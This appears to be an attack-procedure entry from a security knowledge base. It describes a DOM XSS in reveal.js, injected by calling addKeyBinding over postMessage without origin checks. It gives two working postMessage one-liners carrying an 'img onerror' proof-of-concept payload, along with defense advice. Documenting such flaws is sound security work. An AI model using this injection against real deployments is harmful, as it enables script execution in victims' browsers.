---
id: proc-uuid-2
tags:
  - xss
  - dom-xss
  - postmessage
  - key-binding
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/addKeyBinding-iframe]]'
  - '[[commands/addKeyBinding-window]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:20.213Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Key-Binding-via-postMessage

## Summary

This procedure injects a malicious key binding into reveal.js using postMessage to call addKeyBinding, embedding an XSS payload in the description field that will be rendered unescaped later.

## Description

The addKeyBinding method appends objects to the registeredKeyBindings array without validation. The postMessage API allows calling this from any origin due to lack of checks in setupPostMessage. The payload uses an img onerror to execute JS, targeting the victim's domain.

## Requirements

1. Loaded reveal.js page in iframe or window from previous procedure
2. Access to the frame or win object
3. JavaScript console or script execution

## Defense

Defensive measures and detection strategies:

- Validate origins in postMessage listeners
- Sanitize all user-controlled data before HTML insertion in showHelp
- Use Content Security Policy to block inline scripts

## Objectives

1. Register a key binding with XSS payload
2. Persist the payload in registeredKeyBindings
3. Set up for XSS trigger without immediate execution

## Instructions

### Step 1: Iframe Injection

**Context**: Target the iframe and send postMessage with addKeyBinding args containing the payload.

**Command** ([[commands/addKeyBinding-iframe]]):
```javascript
frame.postMessage('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}','*');
```

> Invokes addKeyBinding on Reveal. Expected output: Binding added; inspect registeredKeyBindings to confirm.

### Step 2: Window Alternative

**Context**: Use for window.open scenario.

**Command** ([[commands/addKeyBinding-window]]):
```javascript
win.postMessage('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}','*');
```

> Similar to iframe. Expected output: Binding registered in window context.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/addKeyBinding-iframe]]
- [[commands/addKeyBinding-window]]

## Tools Used


## Tags

- xss
- injection
- javascript
